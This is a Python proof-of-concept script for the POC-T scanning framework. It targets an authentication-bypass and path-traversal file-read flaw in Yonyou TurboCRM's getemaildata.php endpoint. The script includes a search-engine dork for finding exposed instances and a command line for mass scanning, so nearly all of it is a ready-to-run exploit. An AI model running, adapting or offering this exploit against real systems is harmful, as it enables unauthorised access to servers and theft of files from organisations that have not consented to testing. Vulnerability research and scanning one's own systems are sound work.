#!/usr/bin/env python
# -*- encoding: utf-8 -*-
"""
@File    :   turbocrm_lfi_1
@DateTime :  2024/7/9 22:53 


@Dork
   app="用友-TurboCRM" && title=="用友TurboCRM"

@Cmdline
    python POC-T.py -s turbocrm_lfi_1.py -aF 'app="用友-TurboCRM" && title=="用友TurboCRM"'

"""


from lib.utils.http import request_ex, get_http_url, urljoin_ex
from lib.utils.dic import Wordlist
from lib.core.data import logger as log


def poc(url):
    url = urljoin_ex(url, "/ajax/getemaildata.php?DontCheckLogin=1&filePath=../version.txt")
    resp = request_ex("get", url)
    if resp and resp.status_code == 200:
        print(url, resp.text)
        return True
    else:
        return False



